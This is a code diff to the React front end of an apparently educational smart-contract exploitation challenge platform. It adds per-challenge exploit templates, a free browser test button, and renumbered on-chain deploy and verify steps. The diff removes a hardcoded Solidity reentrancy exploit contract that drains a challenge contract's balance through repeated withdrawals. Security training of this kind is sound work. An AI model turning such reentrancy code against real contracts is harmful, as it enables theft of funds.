@@ -12,34 +12,7 @@ import {
 import { CONTRACT_ADDRESSES } from '../config/contracts'
 import { CHALLENGE_DETAILS } from '../config/challengeDetails'
 import { parseAbi, encodeFunctionData } from 'viem'
-
-const EXPLOIT_TEMPLATE = `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
-
-interface IChallenge {
-    function deposit() external payable;
-    function withdraw(uint256 amount) external;
-    function balances(address) external view returns (uint256);
-}
-
-contract Exploit {
-    IChallenge public challenge;
-    
-    constructor(address _challenge) {
-        challenge = IChallenge(_challenge);
-    }
-    
-    function attack() external payable {
-        challenge.deposit{value: msg.value}();
-        challenge.withdraw(challenge.balances(address(this)));
-    }
-    
-    receive() external payable {
-        if (address(challenge).balance > 0) {
-            challenge.withdraw(challenge.balances(address(this)));
-        }
-    }
-}`
+import { runTest, loadExploitTemplate } from '../utils/testRunner'
 
 function ChallengeInteraction({ challenge, onBack }) {
   const { address } = useAccount()
@@ -50,8 +23,10 @@ function ChallengeInteraction({ challenge, onBack }) {
   const [isDeployingExploit, setIsDeployingExploit] = useState(false)
   const [isExecuting, setIsExecuting] = useState(false)
   const [isVerifying, setIsVerifying] = useState(false)
+  const [isTesting, setIsTesting] = useState(false)
+  const [testResult, setTestResult] = useState(null)
   const [status, setStatus] = useState('')
-  const [exploitCode, setExploitCode] = useState(EXPLOIT_TEMPLATE)
+  const [exploitCode, setExploitCode] = useState('')
   const [compiledExploit, setCompiledExploit] = useState(null)
   const [leftPanelWidth, setLeftPanelWidth] = useState(50)
   const [isResizing, setIsResizing] = useState(false)
@@ -71,6 +46,23 @@ function ChallengeInteraction({ challenge, onBack }) {
       loadChallengeAddress()
     }
   }, [challenge, config])
+
+  useEffect(() => {
+    if (challenge) {
+      loadTemplate()
+    }
+  }, [challenge])
+
+  const loadTemplate = async () => {
+    try {
+      const template = await loadExploitTemplate(challenge.id)
+      if (template) {
+        setExploitCode(template)
+      }
+    } catch (error) {
+      console.error('Failed to load template:', error)
+    }
+  }
 
   const loadChallengeAddress = async () => {
     try {
@@ -118,6 +110,7 @@ function ChallengeInteraction({ challenge, onBack }) {
   }, [deployHash, isDeployConfirming])
 
   const handleCompileExploit = async (code, result) => {
+    setExploitCode(code)
     if (!result) {
       setStatus('Compiling exploit contract...')
       try {
@@ -146,6 +139,33 @@ function ChallengeInteraction({ challenge, onBack }) {
           setStatus('Exploit contract compiled successfully')
         }
       }
+    }
+  }
+
+  const handleTestExploit = async () => {
+    if (!exploitCode) {
+      setStatus('Please write your exploit code first')
+      return
+    }
+
+    setIsTesting(true)
+    setTestResult(null)
+    setStatus('Running browser test...')
+
+    try {
+      const result = await runTest(challenge.id, exploitCode)
+      setTestResult(result)
+      
+      if (result.passed) {
+        setStatus('✓ Browser test PASSED! You can now deploy on-chain.')
+      } else {
+        setStatus(`✗ Browser test FAILED: ${result.error || 'Test did not pass'}`)
+      }
+    } catch (error) {
+      setTestResult({ success: false, passed: false, error: error.message })
+      setStatus(`Test error: ${error.message}`)
+    } finally {
+      setIsTesting(false)
     }
   }
 
@@ -323,7 +343,7 @@ function ChallengeInteraction({ challenge, onBack }) {
             </div>
 
             <div style={styles.stepSection}>
-              <div style={styles.stepTitle}>STEP 2: WRITE & COMPILE EXPLOIT</div>
+              <div style={styles.stepTitle}>STEP 2: WRITE & TEST EXPLOIT (FREE)</div>
               <div style={styles.editorWrapper}>
                 <CodeEditor
                   initialCode={exploitCode}
@@ -332,10 +352,36 @@ function ChallengeInteraction({ challenge, onBack }) {
                   compact={true}
                 />
               </div>
+              <div style={styles.testSection}>
+                <button
+                  style={{...styles.testButton, opacity: (isTesting || !exploitCode) ? 0.6 : 1}}
+                  onClick={handleTestExploit}
+                  disabled={isTesting || !exploitCode}
+                >
+                  {isTesting ? 'TESTING...' : '🧪 TEST (FREE)'}
+                </button>
+                {testResult && (
+                  <div style={{
+                    ...styles.testResult,
+                    backgroundColor: testResult.passed ? '#00ff00' : '#ff0000',
+                    color: '#000000'
+                  }}>
+                    {testResult.passed ? '✓ TEST PASSED' : '✗ TEST FAILED'}
+                    {testResult.error && (
+                      <div style={styles.testError}>{testResult.error}</div>
+                    )}
+                  </div>
+                )}
+              </div>
             </div>
 
             <div style={styles.stepSection}>
-              <div style={styles.stepTitle}>STEP 3: DEPLOY EXPLOIT</div>
+              <div style={styles.stepTitle}>STEP 3: COMPILE EXPLOIT</div>
+              <div style={styles.hint}>Compile your exploit before deploying on-chain</div>
+            </div>
+
+            <div style={styles.stepSection}>
+              <div style={styles.stepTitle}>STEP 4: DEPLOY EXPLOIT (ON-CHAIN)</div>
               {exploitAddress ? (
                 <div style={styles.address}>Deployed: {exploitAddress}</div>
               ) : (
@@ -350,7 +396,7 @@ function ChallengeInteraction({ challenge, onBack }) {
             </div>
 
             <div style={styles.stepSection}>
-              <div style={styles.stepTitle}>STEP 4: EXECUTE EXPLOIT</div>
+              <div style={styles.stepTitle}>STEP 5: EXECUTE EXPLOIT (ON-CHAIN)</div>
               <button
                 style={{...styles.button, opacity: (isExecuting || isExecutePending || isExecuteConfirming || !exploitAddress) ? 0.6 : 1}}
                 onClick={handleExecuteExploit}
@@ -361,7 +407,7 @@ function ChallengeInteraction({ challenge, onBack }) {
             </div>
 
             <div style={styles.stepSection}>
-              <div style={styles.stepTitle}>STEP 5: VERIFY SOLUTION</div>
+              <div style={styles.stepTitle}>STEP 6: VERIFY SOLUTION (ON-CHAIN)</div>
               <button
                 style={{...styles.button, opacity: (isVerifying || isVerifyPending || isVerifyConfirming) ? 0.6 : 1, backgroundColor: '#ff0000'}}
                 onClick={handleVerify}
@@ -486,6 +532,41 @@ const styles = {
     fontFamily: 'monospace',
     color: '#ffffff',
     flexShrink: 0,
+  },
+  testSection: {
+    marginTop: '12px',
+    display: 'flex',
+    flexDirection: 'column',
+    gap: '8px',
+  },
+  testButton: {
+    backgroundColor: '#00ff00',
+    color: '#000000',
+    border: '2px solid #00ff00',
+    padding: '12px 24px',
+    fontSize: '12px',
+    fontWeight: 'bold',
+    cursor: 'pointer',
+    fontFamily: 'monospace',
+    textTransform: 'uppercase',
+  },
+  testResult: {
+    padding: '12px',
+    fontSize: '12px',
+    fontFamily: 'monospace',
+    fontWeight: 'bold',
+    border: '2px solid #000000',
+  },
+  testError: {
+    marginTop: '8px',
+    fontSize: '11px',
+    fontFamily: 'monospace',
+  },
+  hint: {
+    fontSize: '11px',
+    color: '#888888',
+    fontStyle: 'italic',
+    marginTop: '4px',
   },
 }
 
